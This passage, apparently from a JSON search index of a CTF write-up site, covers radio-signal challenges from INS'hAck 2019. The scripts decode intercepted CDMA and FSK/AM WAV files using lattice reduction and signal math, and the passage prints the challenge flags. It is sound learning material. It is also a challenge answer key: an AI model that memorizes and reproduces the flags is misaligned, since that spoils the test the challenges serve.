plt.plot(sorted(means),range(len(means))) The mean values for the time slots separate into several distinct groups, depending of what the transmitters send. This is the interference pattern. The first side groups are located at +/-7500, so we can compute the number of the bin by dividing by 7500 and rounding to the nearest integer. We were given that the transmission uses 32-bit codes, so we can reshape the data into a matrix with 32 columns and find an orthogonal base in that data set. There are several ways, but LLL-lattice reduction worked fine. matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) base = reduceLattice(matrix) This gave 8 base vectors that span the data set. (It was at this stage the smell of flag started to show, as we were given the information that there were 8 devices.) The base was: [ 1, 1, 1, 1,-1,-1, 1, 1,-1,-1, 1,-1, 1,-1,-1,-1, 1,-1,-1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1,-1, 1, 1] [-1,-1, 1, 1, 1,-1,-1, 1,-1, 1, 1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1, 1, 1,-1, 1,-1,-1,-1, 1, 1, 1, 1] [ 1,-1, 1, 1, 1,-1,-1,-1,-1,-1,-1,-1,-1,-1, 1, 1,-1, 1,-1,-1,-1,-1,-1, 1,-1,-1, 1, 1, 1,-1,-1, 1] [-1, 1, 1, 1,-1,-1,-1,-1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1, 1, 1, 1,-1,-1, 1,-1, 1,-1, 1, 1, 1, 1, 1] [ 0, 1,-1,-1,-1,-2, 1, 2, 0, 2, 0,-2, 0, 0, 0,-1, 3,-1, 2,-1,-1,-1, 3,-3, 0,-2, 0,-1,-1, 0, 1, 0] [-1, 0, 0, 0,-2, 1, 2,-1, 1,-1, 3, 1, 3,-1,-1, 0, 0,-2,-1, 2, 2, 0, 0, 0, 1, 3, 1, 2, 0,-1, 0, 1] [-1, 1,-1, 1,-1,-1,-1, 1, 1, 1,-1,-1, 1, 1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1,-1,-1, 1,-1,-1,-1, 1,-1] [ 1, 0, 2, 0, 2, 1, 2, 1,-1, 1, 1,-1,-1, 1,-1,-2, 0,-2,-1, 0,-2, 2, 2,-2, 3, 1,-1, 0, 0, 1, 2,-1] We can see that this base is not perfect, as all base vectors should have been 1 or -1. This is because LLL minimizes vectors with the L2-norm, not the L-inf-norm. But the base was good enough to use, if we just reduce the rawdata after decoding with this base. To decode the data, we take the dot product with the base and reduce again: rawdata = base.dot(matrix.transpose()) data = reduceLattice(rawdata)","title":"Analysis"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#source-code","text":"This script solves the challenge: import wavio, fpylll, bitarray, numpy def reduceLattice(lattice): A = fpylll.IntegerMatrix.from_matrix(lattice) M = fpylll.GSO.Mat(A) M.update_gso() L = fpylll.LLL.Reduction(M) L() return numpy.array(map(list, A), dtype=int) wav = wavio.read('CDMA_interception.wav') # Compute mean values for every time slot means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) # Convert mean values to integers and reshape into matrix of data matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) # Get reduced basis for matrix through lattice reduction base = reduceLattice(matrix)[:8] # Compute raw data through dot product with basis rawdata = base.dot(matrix.transpose()) # Reduce raw data more, as base is not perfect data = reduceLattice(rawdata) # To through all 8 data streams and print flag if found for d in data: plaintext = bitarray.bitarray(list(d<0),endian='big').tobytes() if 'INSA' in plaintext: print plaintext Running it gives the flag: $ python solve.py Oh hi, I see you've found my secret device. Want a flag ? Here you go INSA{Elektr0nenklange_Aus_d3m_R4di0l4nD}","title":"Source code"},{"location":"sdr/challs-dont-matter-anymore/writeup/","text":"import wave import matplotlib.pyplot as plt import struct CODE_LENGTH = 32 assert CODE_LENGTH%2 == 0 N_HOSTS = 8 N_BITS = 880 wav = wave.open('CDMA_interception.wav', 'r') raw_signal=[] for i in range(N_BITS*CODE_LENGTH): frames = wav.readframes(100) samples = struct.unpack('h'*100, frames) raw_signal.append(sum(samples)/100) buckets = [ (2000, 6000), (8000, 13000), (15000, 21000), (22500, 28000), (30000, 36000), (38000, 43000), (45500, 50000), (53000, 57500), (60000, 63000)] signal = [] for sig in raw_signal: for i in range(10): if buckets[i][0]<=sig+32768<=buckets[i][1]: signal.append(float(i)/N_HOSTS) break codeset = set() for veci in range(0,CODE_LENGTH*N_BITS,CODE_LENGTH): vec = [round(s*N_HOSTS) for s in signal[veci:veci+CODE_LENGTH]] codeset.add(tuple(vec)) print len(codeset) codelist = list(codeset) recovered_codes = set() for i in range(len(codelist)): similar = [] for j in range(len(codelist)): if i==j: continue if all(abs(b-a)<=1 for b,a in zip(codelist[i], codelist[j])): similar.append(i) recovered_codes.add(tuple([b-a for b,a in zip(codelist[i], codelist[j])])) print len(recovered_codes) for rc in recovered_codes: code = [bool(c+1.) for c in rc] recovered_sig = [] for nbit, veci in enumerate(range(0,CODE_LENGTH*N_BITS,CODE_LENGTH)): vec = [round(s*N_HOSTS) for s in signal[veci:veci+CODE_LENGTH]] nvec = [v*2-5 for v in vec] res = sum(rci*nvi for rci, nvi in zip(rc, nvec)) recovered_sig.append(res) assert len(set(recovered_sig)) == 2 mx = max(recovered_sig) sig = '' ch = '' for rsg in recovered_sig: ch += '1' if rsg==mx else '0' if len(ch) == 8: sig += chr(int(ch,2)) ch = '' print sig print '\\n\\n==================\\n\\n'","title":"Writeup"},{"location":"sdr/lit-fam/hackingforsoju/","text":"WRITE UP - INS'HACK 2019: LIT FAM This is a write-up for the LIT FAM dual challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju. Description We have a proof of extraterrestrial life ! Or is it just a random amateur radio operator ? Anyway, here is a strange RF interception. The file contains two independent flags The RF interception was given as a WAV file, and The A-part flag matches INSA{[A-Z]+} and the F-part matches INSA{[A-Za-z0-9_]+}. Initial analysis If we open the WAV file in Audacity and zoom in, we can see that the file consists of sine-waves with two different frequencies. This is called FSK modulation, the changing frequency is used to encode the data. If we zoom out a bit more, we can see that the amplitude of the FSK signal varies and encodes an analog signal. This is AM, amplitude modulation, the amplitude is used to encode the data. Decoding FSK There are several ways to decode an FSK signal, but as we have a pure sine wave there is a special trick. The trick is based on the fact that the second derivative of sin(w*x) is -w*w * sin(w*x) . If we take the second derivative and divide by the original function value we get -w**2 , so we can extract the time. We have a sampled sine wave in discrete time f(n) = A * sin(n*dt*w) , so we can not get the exact derivative, but we can use approximations and simplifications. It will be enough to decode the data. The second derivative (ignoring discretization constant) can be approximated with f''(n) = f(n-1) - 2*f(n) + f(n+1) = = A * (sin(n*dt*w - dt*w) - 2*sin(n*dt*w) + sin(n*dt*w + dt*w)) = = A * (sin(n*dt*w)*cos(dt*w) - cos(n*dt*w)*sin(dt*w) - 2*sin(n*dt*w) + sin(n*dt*w)*cos(dt*w) + cos(n*dt*w)*sin(w*t) = = A * (2*sin(n*dt*w)*cos(dt*w) - 2*sin(n*dt*w)) = = A * 2 * sin(n*dt*w) * (cos(dt*w) - 1) so the value of f''(n) / f(n) is f''(n) / f(n) = (A * 2 * sin(n*dt*w) * (cos(dt*w) - 1)) / A*sin(n*dt*w) = = 2 * (cos(dt*w - 1) This expression only depends on the frequency of the signal, wich is the quantity we want to extract! We can now decode and plot the raw frequency dependent data: import wavio from matplotlib import pyplot as plt wav = wavio.read('FAM.wav') l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:500], wav.data[1:], wav.data[2:])] plt.plot(l) plt.show() The frequency signal is stable at -0.1 and -0.4, except for at the boundaries where the bit level changes. The bits change every 20th sample, so we can reduce the data set by picking every 20th sample, starting at sample 10. We compute the bit value using 0.25 as a threshold value. >>> b = [int(e<-0.25) for e in l][10::20] >>> numpy.array(b[:80]).reshape((10,8)) array([[1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0], [1, 1, 0, 1, 1, 1, 0, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 1, 0, 1, 0, 0, 0], [1, 1, 0, 1, 0, 0, 0, 0], [0, 1, 1, 0, 0, 1, 1, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 0, 0, 0, 0, 0, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0]]) We can see that the the last bits align nicely and we should be able to decode this as ASCII. However, the challenge creators put in a small trick. The bytes are stored in big endian with only 7 bits given for the first byte. One way to decode the bits is to add a zero to the beginning and decode using bitarray. Decoding AM The simplest circuit to decode an AM signal with is a diode receiver. The digital equivalent is to use the abs() function, we can just write back the rectified data to a WAV-file and listen to it. Solution script This is the final solution script: import wavio, bitarray wav = wavio.read('FAM.wav') wavio.write('rectified.wav', abs(wav.data), wav.rate) l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:10000], wav.data[1:], wav.data[2:])] print bitarray.bitarray([0]+[int(e<-0.25) for e in l][10::20]).tobytes() Running the script prints the the flag _in_th3_AiR_4_u_4nd_Me}INSA{iS_in_th3_AiR_4_u_4nd_Me}INSA{iS_ih* and if we listen to the file rectified.wav we can hear some space sounds followed by the voice message: The flag is I, N, S, A, opening bracket, RADIOACTIVITY, closing bracket. All letters are in uppercase. so the flag is INSA{RADIOACTIVITY}.","title":"lit-fam"},{"location":"sdr/lit-fam/hackingforsoju/#write-up-inshack-2019-lit-fam","text":"This is a write-up for the LIT FAM dual challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju.","title":"WRITE UP - INS'HACK 2019: LIT FAM"},{"location":"sdr/lit-fam/hackingforsoju/#description","text":"We have a proof of extraterrestrial life ! Or is it just a random amateur radio operator ? Anyway, here is a strange RF interception. The file contains two independent flags The RF interception was given as a WAV file, and The A-part flag matches INSA{[A-Z]+} and the F-part matches INSA{[A-Za-z0-9_]+}.","title":"Description"},{"location":"sdr/lit-fam/hackingforsoju/#initial-analysis","text":"If we open the WAV file in Audacity and zoom in, we can see that the file consists of sine-waves with two different frequencies. This is called FSK modulation, the changing frequency is used to encode the data. If we zoom out a bit more, we can see that the amplitude of the FSK signal varies and encodes an analog signal. This is AM, amplitude modulation, the amplitude is used to encode the data.","title":"Initial analysis"},{"location":"sdr/lit-fam/hackingforsoju/#decoding-fsk","text":"There are several ways to decode an FSK signal, but as we have a pure sine wave there is a special trick. The trick is based on the fact that the second derivative of sin(w*x) is -w*w * sin(w*x) . If we take the second derivative and divide by the original function value we get -w**2 , so we can extract the time. We have a sampled sine wave in discrete time f(n) = A * sin(n*dt*w) , so we can not get the exact derivative, but we can use approximations and simplifications. It will be enough to decode the data. The second derivative (ignoring discretization constant) can be approximated with f''(n) = f(n-1) - 2*f(n) + f(n+1) = = A * (sin(n*dt*w - dt*w) - 2*sin(n*dt*w) + sin(n*dt*w + dt*w)) = = A * (sin(n*dt*w)*cos(dt*w) - cos(n*dt*w)*sin(dt*w) - 2*sin(n*dt*w) + sin(n*dt*w)*cos(dt*w) + cos(n*dt*w)*sin(w*t) = = A * (2*sin(n*dt*w)*cos(dt*w) - 2*sin(n*dt*w)) = = A * 2 * sin(n*dt*w) * (cos(dt*w) - 1) so the value of f''(n) / f(n) is f''(n) / f(n) = (A * 2 * sin(n*dt*w) * (cos(dt*w) - 1)) / A*sin(n*dt*w) = = 2 * (cos(dt*w - 1) This expression only depends on the frequency of the signal, wich is the quantity we want to extract! We can now decode and plot the raw frequency dependent data: import wavio from matplotlib import pyplot as plt wav = wavio.read('FAM.wav') l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:500], wav.data[1:], wav.data[2:])] plt.plot(l) plt.show() The frequency signal is stable at -0.1 and -0.4, except for at the boundaries where the bit level changes. The bits change every 20th sample, so we can reduce the data set by picking every 20th sample, starting at sample 10. We compute the bit value using 0.25 as a threshold value. >>> b = [int(e<-0.25) for e in l][10::20] >>> numpy.array(b[:80]).reshape((10,8)) array([[1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0], [1, 1, 0, 1, 1, 1, 0, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 1, 1, 0, 1, 0, 0, 0], [1, 1, 0, 1, 0, 0, 0, 0], [0, 1, 1, 0, 0, 1, 1, 0], [1, 0, 1, 1, 1, 1, 1, 0], [1, 0, 0, 0, 0, 0, 1, 0], [1, 1, 0, 1, 0, 0, 1, 0]]) We can see that the the last bits align nicely and we should be able to decode this as ASCII. However, the challenge creators put in a small trick. The bytes are stored in big endian with only 7 bits given for the first byte. One way to decode the bits is to add a zero to the beginning and decode using bitarray.","title":"Decoding FSK"},{"location":"sdr/lit-fam/hackingforsoju/#decoding-am","text":"The simplest circuit to decode an AM signal with is a diode receiver. The digital equivalent is to use the abs() function, we can just write back the rectified data to a WAV-file and listen to it.","title":"Decoding AM"},{"location":"sdr/lit-fam/hackingforsoju/#solution-script","text":"This is the final solution script: import wavio, bitarray wav = wavio.read('FAM.wav') wavio.write('rectified.wav', abs(wav.data), wav.rate) l = [(a-2*b+c) / float(b) for a,b,c in zip(wav.data[:10000], wav.data[1:], wav.data[2:])] print bitarray.bitarray([0]+[int(e<-0.25) for e in l][10::20]).tobytes() Running the script prints the the flag _in_th3_AiR_4_u_4nd_Me}INSA{iS_in_th3_AiR_4_u_4nd_Me}INSA{iS_ih* and if we listen to the file rectified.wav we can hear some space sounds followed by the voice message: The flag is I, N, S, A, opening bracket, RADIOACTIVITY, closing bracket. All letters are in uppercase. so the flag is INSA{RADIOACTIVITY}.","title":"Solution script"},{"location":"sdr/lit-fam/writeup/","text":"import struct import wave wav = wave.open('FAM.wav', 'r') am_sig = [] nframes = wav.getnframes() frames = wav.readframes(nframes) samples = struct.unpack('h'*nframes, frames) lastinvert = 0 sgn = 1 fm_sig='' for i in range(15,nframes,20): sv = max(map(abs,samples[i:i+20])) am_sig.append(sv*2-32768) switchcnt = 0 for j in range(19): if samples[i+j]*samples[i+j+1]<0: switchcnt += 1 fm_sig += '1' if switchcnt > 2 else '0' # INSA{iS_in_th3_AiR_4_u_4nd_Me} for cut in range(8): s = fm_sig[cut:800+cut] print ''.join(chr(int(s[i*8:i*8+8],2)) for i in range(len(s)//8)) # INSA{RADIOACTIVITY} output_wav = wave.open('extracted_am.wav', 'w') output_wav.setparams((1, 2, 44100, 0, 'NONE', 'not compressed')) packed_values=[] for sample in am_sig: packed_values.append(struct.pack('h', sample)) output_wav.writeframes(''.join(packed_values)) output_wav.close()","title":"Writeup"}]}